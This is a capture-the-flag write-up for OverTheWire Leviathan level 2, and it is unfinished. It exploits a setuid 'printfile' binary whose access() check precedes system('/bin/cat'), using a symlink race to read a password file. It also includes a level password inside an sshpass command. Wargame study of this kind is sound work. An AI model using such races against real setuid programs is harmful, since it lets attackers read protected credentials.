
# Leviathan 2 (Over The Wire CTF)

Credentials:

- Username: `leviathan2`
- Password: `NsN1HwFoyN`

# Problem

The program `printfile` has wrong ownership permissions, as it's owned by the user `leviathan2`
but the group `leviathan3`, which we can abuse.

```bash
leviathan2@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Jun 20 04:07 .
drwxr-xr-x 83 root       root        4096 Jun 20 04:08 ..
-rw-r--r--  1 root       root         220 Mar 31 08:41 .bash_logout
-rw-r--r--  1 root       root        3771 Mar 31 08:41 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15068 Jun 20 04:07 printfile
-rw-r--r--  1 root       root         807 Mar 31 08:41 .profile
```

If we try to fiddle around with the file paths, we can see that the binary calls `access()`
and `/bin/cat %s` but doesn't verify whether or not it's a symbolic link. An alternative way
probably would be to abuse whitespaces because the call of `/bin/cat` leads to multiple arguments
when the entered parameter contains whitespaces.

```bash
leviathan2@gibson:~$ ltrace ./printfile /tmp/"foo bar qux.txt"
__libc_start_main(0x80490ed, 2, 0xffffd464, 0 <unfinished ...>
access("/tmp/foo bar qux.txt", 4)                                = 0
snprintf("/bin/cat /tmp/foo bar qux.txt", 511, "/bin/cat %s", "/tmp/foo bar qux.txt") = 29
geteuid()                                                        = 12002
geteuid()                                                        = 12002
setreuid(12002, 12002)                                           = 0
system("/bin/cat /tmp/foo bar qux.txt"/bin/cat: /tmp/foo: No such file or directory
/bin/cat: bar: No such file or directory
/bin/cat: qux.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                           = 256
+++ exited (status 0) +++
```


# Solution

```bash
watch -n 0.1 "touch /tmp/cookie/link; ln -sf /etc/leviathan_pass/leviathan3 /tmp/cookie/link; rm /tmp/cookie/link;"
```


We can download the binary to be able to analyze it.

```bash
cd ./challenge;

sshpass -p "NsN1HwFoyN" scp -P 2223 leviathan2@leviathan.labs.overthewire.org:/home/leviathan2/printfile ./
```

# Solution

TODO
